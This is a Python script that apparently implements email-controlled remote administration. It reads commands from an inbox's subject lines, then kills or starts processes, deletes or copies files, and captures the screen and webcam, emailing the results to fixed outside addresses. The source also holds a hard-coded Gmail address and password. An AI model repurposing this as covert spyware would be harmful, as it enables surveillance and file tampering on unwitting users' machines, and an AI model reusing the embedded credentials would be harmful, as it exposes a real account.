from sender import *
from receiver import *
from ui_login import * 

from tkinter import *
from tkinter import ttk
from PIL import ImageTk, Image
import numpy as np
import cv2
import webbrowser
from utils import *
from datetime import datetime
import os 
from shutil import copyfile

now = datetime.now()

def get_one_content(content):
	token = content.split(":")
	return token[-1]

sender = Sender("thaovo2962002@gmail.com","a2k46pbc")
receiver = Receiver ("thaovo2962002@gmail.com","a2k46pbc")
# receiver = Receiver(email,password)
subject, content = receiver.get_mail()
print(subject)
print("=============")
print(content)

rec = ["trnhquchuy@gmail.com","huymodelml@gmail.com"]
# subject = "list_process"
pid = None 
name_prog = ""
path = ""
dst = ""

if subject == "mac address":
	mac_add = mac_address()
	sender.send(mac_add,"Result of {}".format(subject),rec)
	print("succes mac address")

elif subject == "capture screen":
	capture_screen()
	sender.image_send("Screen capture at {}".format(now),"save_img.png","screen capture",rec)
	print("succes capture screen")

elif subject == "list app":
	l1,l2,l3 = list_apps()
	print(l1,l2,l3)
	res = "List of app: \n"
	for i in l1:
		res += "- {} \n".format(i)
	sender.send(res,"Result of {}".format(subject),rec)
    
elif subject == "list process":
	l1,l2,l3 = list_processes()
	print(l1,l2,l3)
	res = "List of process: \n"
	for i in l1:
		res += "- {} \n".format(i)
	sender.send(res,"Result of {}".format(subject),rec)

elif subject == "kill":
	pid = get_one_content(content)
	r = kill(pid)
	sender.send("Success","You have succeeded in {}".format(subject+pid),rec)

elif subject == "start":
	name_prog = get_one_content(content)
	start(name_prog)
	sender.send("Success","You have succeeded in {}".format(subject+name_prog),rec)

elif subject == "show tree":
	listT = showTree()
	res = "List of Tree: \n"
	for tree in listT:
		res += "- {} \n".format(tree)
	sender.send(res,"Result of {}".format(subject),rec)

elif subject == "list dir":
	path = get_one_content(content)
	check, listD = sendListDirs(path)
	if check == False:
		sender.send("No file path","Please choose the correct path",rec)
	res = "List of Directory: \n"
	for tree in listD:
		res += "- {} \n".format(tree)
	sender.send(res,"Result of {}".format(subject),rec)

elif subject == "delete file":
	path = get_one_content(content)
	check, p = delFile(path)
	if check == False:
		sender.send("No file path","Please choose the correct path",rec)
	else:
		sender.send("Success","You have succeeded in {}".format(subject),rec)

elif subject == "copy file":
	token = content.split("\r\n")
	print(token)
	path  = token[0].split(":")[-1]
	dst = token[1].split(":")[-1]
	print("path:" ,path,"dst",dst.split("\r")[0])
	check, p = copyfile(path,dst)
	if check == False:
		sender.send("No file path","Please choose the correct path",rec)
	else:
		sender.send("Success","You have succeeded in {}".format(subject),rec)

elif subject == "webcam":
	webcam()
	sender.image_send("Webcam capture at {}".format(now),"save_img.png","screen capture",rec)
	print("succes capture webcam")